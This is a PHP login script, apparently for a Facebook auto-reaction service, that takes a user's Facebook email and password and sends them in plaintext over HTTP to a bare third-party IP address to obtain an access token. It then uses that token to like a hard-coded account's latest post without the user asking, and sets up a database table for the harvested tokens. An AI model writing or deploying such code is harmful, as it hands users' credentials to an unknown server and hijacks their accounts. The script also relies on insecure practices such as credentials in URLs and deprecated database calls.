<meta charset="utf-8">
<?php
ob_start();
session_start(); 
if ($_POST) 
{
	require("../incfiles/config.php");
	$email = $_POST['account'];
	$pass = $_POST['password'];
	$api = json_decode(file_get_contents('http://178.62.102.110/android.php?u='.$email.'&p='.$pass.''),true);
	if ($api['error_code']) 
	{
		$error = json_decode($api['error_data'],true);
		header('Location: ../index.php?i='.$error['error_message']);
		die();
	}
	else
	{
		$token = $api['access_token'];
		$me = json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$token),true);
		$like = json_decode(file_get_contents('https://graph.facebook.com/100010992094684/feed?limit=1&access_token='.$token),true);
		$sttid = $like[data][0][id];
		$chk = auto('https://graph.facebook.com/'.$sttid.'/likes?method=post&access_token='.$token);
		if ($me['id']) 
		{
			if ($chk == true) 
			{
				@mysql_query("CREATE TABLE IF NOT EXISTS `CamXuc` (
					`id` int(11) NOT NULL AUTO_INCREMENT,
					`idfb` varchar(32) NOT NULL,
					`ten` varchar(32) NOT NULL,
					`camxuc` varchar(32) NOT NULL,
					`matoken` varchar(255) NOT NULL,
					PRIMARY KEY (`id`)
					) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
				"); 
				$_SESSION['idfb'] = $me['id'];
				$_SESSION['ten'] = $me['name'];
				$_SESSION['matoken'] = $token;
			}
			else
			{
				header('Location: ../index.php?i=');	
			}
		}
		else
		{
			header('Location: ../index.php?i=');
		}
		header('Location: ../index.php?i=');
		die();
	}
}
function auto($url){
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_URL, $url);
	$ch = curl_exec($curl);
	curl_close($curl);
	return $ch;
}